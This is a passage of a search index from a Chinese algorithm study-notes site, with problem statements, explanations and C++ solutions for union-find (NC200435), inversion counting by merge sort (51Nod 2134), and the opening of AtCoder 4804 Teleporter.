\u77ee\u6811\u5408\u5e76\u5230\u9ad8\u6811\u4e0a\uff0c\u9ad8\u6811\u7684\u9ad8\u5ea6\u4fdd\u6301\u4e0d\u53d8 if (height[x] < height[y]) { group[x] = y; }else{ group[y] = x; } } } int main() { int n, m, p, x, y; cin >> n >> m >> p; // \u521d\u59cb\u5316 init_set(); // \u8f93\u5165 for (int i = 0; i < m; i++) { cin >> x >> y; union_set(x, y); } // for (int i = 0; i < p; i++) { cin >> x >> y; if (find_set(x) == find_set(y)) { cout << \"Yes\" << endl; } else { cout << \"No\" << endl; } } return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 NC200435 \u627e\u670b\u53cb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#nc200435","text":"","title":"\u725b\u5ba2\u7f51 NC200435 \u627e\u670b\u53cb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#_1","text":"\u725b\u5ba2\u7f51 NC200435 \u627e\u670b\u53cb \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#11-limit","text":"Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 65536K\uff0c\u5176\u4ed6\u8bed\u8a00131072K","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#12-problem-description","text":"\u2014\u2014\u4f60\u8981\u662f\u613f\u610f\uff0c\u6211\u5c31\u6c38\u8fdc\u5b58\u5728\u3002 \u67d0\u4eba\u7684\u670b\u53cb\u5708\u5b9e\u5728\u662f\u8fc7\u4e8e\u5e9e\u5927\u4e14\u590d\u6742\uff0c\u8981\u5224\u65ad\u4e24\u4e2a\u4eba\u662f\u4e0d\u662f\u670b\u53cb\uff0c\u90a3\u8fd8\u771f\u4e0d\u5bb9\u6613\u3002\u73b0\u7ed9\u51fa\u67d0\u4e2a\u670b\u53cb\u5708\u5173\u7cfb\u56fe\uff0c\u6c42\u4efb\u610f\u7ed9\u51fa\u7684\u4e24\u4e2a\u4eba\u662f\u5426\u662f\u670b\u53cb\u3002\u89c4\u5b9a\uff1a\u5982\u679cx\u548cy\u662f\u670b\u53cb\uff0cy\u548cz\u662f\u670b\u53cb\uff0c\u90a3\u4e48x\u548cz\u4e5f\u662f\u670b\u53cb\u3002\u5982\u679cx\u548cy\u662f\u670b\u53cb\uff0c\u90a3\u4e48x\u7684\u670b\u53cb\u90fd\u662fy\u7684\u670b\u53cb\uff0cy\u7684\u670b\u53cb\u4e5f\u90fd\u662fx\u7684\u670b\u53cb\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#13-input","text":"\u7b2c\u4e00\u884c\uff0c\u4e09\u4e2a\u6574\u6570 n,m,p,(n \\le 50000,m \\le 50000,p\\le50000) \uff0c\u5206\u522b\u8868\u793a\u6709n\u4e2a\u4eba\uff0cm\u4e2a\u670b\u53cb\u5173\u7cfb\uff0c\u8be2\u95eep\u5bf9\u670b\u53cb\u5173\u7cfb\u3002 \u4ee5\u4e0bm\u884c\uff1a\u6bcf\u884c\u4e24\u4e2a\u6570 M_i, M_j\uff0c1 \\le M_i, M_j \\le n \uff0c\u8868\u793a M_i \u548c M_j \u5177\u6709\u670b\u53cb\u5173\u7cfb\u3002 \u63a5\u4e0b\u6765 p \u884c\uff1a\u6bcf\u884c\u4e24\u4e2a\u6570 P_i ,P_j ,\u8be2\u95ee P_i ,P_j \u662f\u5426\u5177\u6709\u76c6\u53cb\u5173\u7cfb","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#14-output","text":"P \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u201cYes\u201d\u6216\u201cNo\u201d(\u4e0d\u5305\u542b\u5f15\u53f7)\u3002\u8868\u793a\u7b2c i \u4e2a\u8be2\u95ee\u7684\u7b54\u6848\u4e3a\u201c\u5177\u6709\u201d\u6216\u201c\u4e0d\u5177\u6709\u201d\u670b\u53cb\u5173\u7cfb\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#15-sample-input","text":"6 5 3 1 2 1 5 3 4 5 2 1 3 1 4 2 3 5 6","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#16-sample-output","text":"Yes Yes No","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#17-source","text":"\u725b\u5ba2\u7f51 NC200435 \u627e\u670b\u53cb","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#2","text":"\u4f7f\u7528\u5e76\u67e5\u96c6\u8fdb\u884c\u6c42\u89e3\u3002 \u4ee5\u5982\u4e0b\u8f93\u5165\u4e3a\u4f8b 6 5 3 1 2 1 5 3 4 5 2 1 3 1 4 2 3 5 6 \u7528 group[i] \u5b58\u50a8\u7b2c i \u4e2a\u70b9\u6240\u5728\u7684\u96c6\u56e2\uff0c\u5982\u56fe1\u6240\u793a\u3002 \\text{Figure 1. \u521d\u59cb\u72b6\u6001} \u6bcf\u6b21\u67e5\u8be2\uff0c\u53ea\u8981\u5224\u65ad\u5176\u6839\u8282\u70b9\u662f\u5426\u76f8\u540c\uff0c\u5373\u53ef\u5224\u65ad\u5176\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a\u96c6\u56e2\u3002\u5e76\u4e14\uff0c\u6bcf\u6b21\u5bf9 group[i] \u8fdb\u884c\u67e5\u8be2\u8fc7\u540e\uff0c\u8fdb\u884c\u8def\u5f84\u538b\u7f29\uff0c\u4e5f\u5c31\u662f\u5c06\u6839\u8282\u70b9\u8d4b\u503c\u7ed9 group[i] \uff0c\u51cf\u5c11\u4e0b\u4e00\u6b21\u7684\u67e5\u8be2\u65f6\u95f4\u3002\u5982\u56fe2\u6240\u793a\u3002 \\text{Figure 2. \u8def\u5f84\u538b\u7f29}","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/#3","text":"#include <iostream> #include <string.h> using namespace std; const int num = 5e4 + 1; int group[num]; int height[num]; // \u521d\u59cb\u5316 void init_set() { for (int i = 1; i < num; i++) { group[i] = i; // \u6811\u7684\u9ad8\u5ea6 height[i] = 0; } } // \u67e5\u627e int find_set(int x) { // \u8def\u5f84\u538b\u7f29 if (x != group[x]) { group[x] = find_set(group[x]); } return group[x]; } void union_set(int x, int y) { x = find_set(x); y = find_set(y); if (height[x] == height[y]) { // \u5408\u5e76\uff0c\u6811\u7684\u9ad8\u5ea6\u52a01 height[x] = height[x] + 1; group[y] = x; } else { // \u77ee\u6811\u5408\u5e76\u5230\u9ad8\u6811\u4e0a\uff0c\u9ad8\u6811\u7684\u9ad8\u5ea6\u4fdd\u6301\u4e0d\u53d8 if (height[x] < height[y]) { group[x] = y; }else{ group[y] = x; } } } int main() { int n, m, p, x, y; cin >> n >> m >> p; // \u521d\u59cb\u5316 init_set(); // \u8f93\u5165 for (int i = 0; i < m; i++) { cin >> x >> y; union_set(x, y); } // for (int i = 0; i < p; i++) { cin >> x >> y; if (find_set(x) == find_set(y)) { cout << \"Yes\" << endl; } else { cout << \"No\" << endl; } } return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/","text":"51Nod 2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000 # \u76ee\u5f55 # 51Nod 2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u8f93\u5165\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u9006\u5e8f\u5bf9\u7684\u4e2a\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u95ee\u6709\u591a\u5c11\u5bf9 (i, j) \u6ee1\u8db3 1 <= i < j <= n \uff0c\u4e14 a[i] > a[j] \u3002 n \u548c a[i] \u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\uff1a 1 <= n <= 1000 1 <= a[i] <= 10^9 1.3. Input # \u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 n \uff0c\u8868\u793a\u6570\u5b57\u957f\u5ea6 \u63a5\u4e0b\u6765 n \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570 a_i , \u8868\u793a\u6570\u7ec4\u7684\u5185\u5bb9\u3002 1.4. Output # \u8f93\u51fa\u4e00\u884c\u4e00\u4e2a\u6570\u5b57\uff0c\u8868\u793a\u9006\u5e8f\u5bf9\u7684\u4e2a\u6570\u3002 1.5. Sample Input # 4 4 3 1 2 1.6. Sample Output # 5 1.7. Source # 51Nod 2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000 2. \u89e3\u8bfb # \u6c42\u89e3\u9006\u5e8f\u6570\u95ee\u9898\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\u662f\u5229\u7528\u5f52\u5e76\u6392\u5e8f\uff0c\u5982\u679c\u5bf9\u5f52\u5e76\u6392\u5e8f\u4e0d\u592a\u719f\u6089\u53ef\u4ee5\u53c2\u8003 \u6211\u4e4b\u524d\u8f6c\u8f7d\u7684\u4e00\u7bc7\u7b14\u8bb0 \u3002 \u5f52\u5e76\u6392\u5e8f\u4e2d\u9700\u8981\u5c06\u5de6\u53f3\u4e24\u4e2a\u5b50\u5e8f\u5217\u5408\u5e76\u6210\u4e00\u4e2a\u65b0\u7684\u5e8f\u5217\uff0c\u5728\u6bcf\u6b21\u5408\u5e76\u65f6\uff0c\u5982\u679c\u6709\u6570\u5b57 \u4ece\u53f3\u5f80\u5de6\u79fb\u52a8 \uff0c\u90a3\u4e48\u5c31\u8bb0\u5f55\u4e0b\u4ed6\u7684 \u79fb\u52a8\u8ddd\u79bb \uff0c\u5c06\u6240\u6709\u79fb\u52a8\u8ddd\u79bb\u6c47\u603b\u4ee5\u540e\uff0c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u9006\u5e8f\u5bf9\u7684\u4e2a\u6570\u3002 3. \u4ee3\u7801 # #include <iostream> #include <string.h> using namespace std; #define MAXN 1000 #define MAXM 1e9 + 1 int leftArray[MAXN]; int rightArray[MAXN]; //\u5f52\u5e76array[p\u2026q]\u4e0earray[q+1\u2026r] int merge(int* array, int start, int mid, int end) { // \u8bb0\u5f55\u9006\u5e8f\u6570\u91cf int inversePairNum = 0; // \u5de6\u5b50\u5e8f\u5217\u8d77\u59cb\u4f4d\u7f6e int n1 = mid - start + 1; // \u53f3\u5b50\u5e8f\u5217\u8d77\u59cb\u4f4d\u7f6e int n2 = end - mid; int i, j; // \u521d\u59cb\u5316\u6570\u7ec4 memset(leftArray, 0, sizeof(leftArray)); memset(rightArray, 0, sizeof(rightArray)); // \u6570\u7ec4\u8d4b\u503c for (i = 0; i < n1; i++) leftArray[i] = array[start + i]; for (j = 0; j < n2; j++) rightArray[j] = array[mid + 1 + j]; leftArray[n1] = MAXM; //\u907f\u514d\u68c0\u67e5\u6bcf\u4e00\u90e8\u5206\u662f\u5426\u4e3a\u7a7a rightArray[n2] = MAXM; i = 0; j = 0; // \u5f52\u5e76 for (int k = start; k <= end; k++) { if (leftArray[i] <= rightArray[j]) { array[k] = leftArray[i]; i++; } else { array[k] = rightArray[j]; j++; // \u82e5\u6709\u6570\u5b57\u4ece\u53f3\u5f80\u5de6\u79fb\u52a8\uff0c\u8bb0\u5f55\u5176\u79fb\u52a8\u8ddd\u79bb inversePairNum += n1 - i; } } // \u8fd4\u56de\u9006\u5e8f\u6570 return inversePairNum; } int mergeSort(int* array, int start, int end) { int sum = 0; if (start < end) { int mid = (start + end) / 2; sum += mergeSort(array, start, mid); sum += mergeSort(array, mid + 1, end); sum += merge(array, start, mid, end); } return sum; } int main() { int array[MAXN]; int inversePairNum; int n; // \u8f93\u5165\u6570\u91cf scanf(\"%d\", &n); // \u8bfb\u53d6\u6570\u5217 for (int i = 0; i < n; i++) { scanf(\"%d\", &array[i]); } // \u5f52\u5e76\u6392\u5e8f inversePairNum = mergeSort(array, 0, n - 1); // \u8f93\u51fa printf(\"%d\\n\", inversePairNum); return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.51Nod 2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#51nod-2134-1000","text":"","title":"51Nod 2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#_1","text":"51Nod 2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#12-problem-description","text":"\u8f93\u5165\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u9006\u5e8f\u5bf9\u7684\u4e2a\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u95ee\u6709\u591a\u5c11\u5bf9 (i, j) \u6ee1\u8db3 1 <= i < j <= n \uff0c\u4e14 a[i] > a[j] \u3002 n \u548c a[i] \u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\uff1a 1 <= n <= 1000 1 <= a[i] <= 10^9","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#13-input","text":"\u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 n \uff0c\u8868\u793a\u6570\u5b57\u957f\u5ea6 \u63a5\u4e0b\u6765 n \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570 a_i , \u8868\u793a\u6570\u7ec4\u7684\u5185\u5bb9\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#14-output","text":"\u8f93\u51fa\u4e00\u884c\u4e00\u4e2a\u6570\u5b57\uff0c\u8868\u793a\u9006\u5e8f\u5bf9\u7684\u4e2a\u6570\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#15-sample-input","text":"4 4 3 1 2","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#16-sample-output","text":"5","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#17-source","text":"51Nod 2134 \u9006\u5e8f\u5bf9\u4e2a\u65701000","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#2","text":"\u6c42\u89e3\u9006\u5e8f\u6570\u95ee\u9898\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\u662f\u5229\u7528\u5f52\u5e76\u6392\u5e8f\uff0c\u5982\u679c\u5bf9\u5f52\u5e76\u6392\u5e8f\u4e0d\u592a\u719f\u6089\u53ef\u4ee5\u53c2\u8003 \u6211\u4e4b\u524d\u8f6c\u8f7d\u7684\u4e00\u7bc7\u7b14\u8bb0 \u3002 \u5f52\u5e76\u6392\u5e8f\u4e2d\u9700\u8981\u5c06\u5de6\u53f3\u4e24\u4e2a\u5b50\u5e8f\u5217\u5408\u5e76\u6210\u4e00\u4e2a\u65b0\u7684\u5e8f\u5217\uff0c\u5728\u6bcf\u6b21\u5408\u5e76\u65f6\uff0c\u5982\u679c\u6709\u6570\u5b57 \u4ece\u53f3\u5f80\u5de6\u79fb\u52a8 \uff0c\u90a3\u4e48\u5c31\u8bb0\u5f55\u4e0b\u4ed6\u7684 \u79fb\u52a8\u8ddd\u79bb \uff0c\u5c06\u6240\u6709\u79fb\u52a8\u8ddd\u79bb\u6c47\u603b\u4ee5\u540e\uff0c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u9006\u5e8f\u5bf9\u7684\u4e2a\u6570\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/1.51Nod-2134_%E9%80%86%E5%BA%8F%E5%AF%B9%E4%B8%AA%E6%95%B01000/#3","text":"#include <iostream> #include <string.h> using namespace std; #define MAXN 1000 #define MAXM 1e9 + 1 int leftArray[MAXN]; int rightArray[MAXN]; //\u5f52\u5e76array[p\u2026q]\u4e0earray[q+1\u2026r] int merge(int* array, int start, int mid, int end) { // \u8bb0\u5f55\u9006\u5e8f\u6570\u91cf int inversePairNum = 0; // \u5de6\u5b50\u5e8f\u5217\u8d77\u59cb\u4f4d\u7f6e int n1 = mid - start + 1; // \u53f3\u5b50\u5e8f\u5217\u8d77\u59cb\u4f4d\u7f6e int n2 = end - mid; int i, j; // \u521d\u59cb\u5316\u6570\u7ec4 memset(leftArray, 0, sizeof(leftArray)); memset(rightArray, 0, sizeof(rightArray)); // \u6570\u7ec4\u8d4b\u503c for (i = 0; i < n1; i++) leftArray[i] = array[start + i]; for (j = 0; j < n2; j++) rightArray[j] = array[mid + 1 + j]; leftArray[n1] = MAXM; //\u907f\u514d\u68c0\u67e5\u6bcf\u4e00\u90e8\u5206\u662f\u5426\u4e3a\u7a7a rightArray[n2] = MAXM; i = 0; j = 0; // \u5f52\u5e76 for (int k = start; k <= end; k++) { if (leftArray[i] <= rightArray[j]) { array[k] = leftArray[i]; i++; } else { array[k] = rightArray[j]; j++; // \u82e5\u6709\u6570\u5b57\u4ece\u53f3\u5f80\u5de6\u79fb\u52a8\uff0c\u8bb0\u5f55\u5176\u79fb\u52a8\u8ddd\u79bb inversePairNum += n1 - i; } } // \u8fd4\u56de\u9006\u5e8f\u6570 return inversePairNum; } int mergeSort(int* array, int start, int end) { int sum = 0; if (start < end) { int mid = (start + end) / 2; sum += mergeSort(array, start, mid); sum += mergeSort(array, mid + 1, end); sum += merge(array, start, mid, end); } return sum; } int main() { int array[MAXN]; int inversePairNum; int n; // \u8f93\u5165\u6570\u91cf scanf(\"%d\", &n); // \u8bfb\u53d6\u6570\u5217 for (int i = 0; i < n; i++) { scanf(\"%d\", &array[i]); } // \u5f52\u5e76\u6392\u5e8f inversePairNum = mergeSort(array, 0, n - 1); // \u8f93\u51fa printf(\"%d\\n\", inversePairNum); return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%80%9D%E7%BB%B4%E9%A2%98/1.AtCoder_4804_Teleporter/","text":"AtCoder 4804 Teleporter # \u76ee\u5f55 # AtCoder 4804 Teleporter \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Constraints 1.5. Output 1.6. Sample Input 1 1.7. Sample Output 1 1.8. Sample Input 2 1.9. Sample Output 2 1.10. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 1024 MB 1.2. Problem Description # The Kingdom of Takahashi has N towns, numbered 1 through N . There is one teleporter in each town. The teleporter in Town i (1 \\leq i \\leq N) sends you to Town A_i . Takahashi, the king, loves the positive integer K . The selfish king wonders what town he will be in if he starts at Town 1 and uses a teleporter exactly K times from there. Help the king by writing a program that answers this question. 1.3. Input # N K A_1\\ A_2\\ \\dots \\ A_N 1.4. Constraints # 2 \\leq N \\leq 2 \\times 10^5 1 \\leq A_i \\leq N 1 \\leq K \\leq 10^{18} 1.5. Output # Print the integer representing the town the king will be in if he starts at Town 1 and uses a teleporter exactly K times from there. 1.6. Sample Input 1 # 4 5 3 2 4 1 1.7. Sample Output 1 # 4 If we start at Town 1 and use the teleporter 5 times, our travel will be as follows: 1 \\to 3 \\to 4 \\to 1 \\to 3 \\to 4 . 1.8. Sample Input 2 # 6 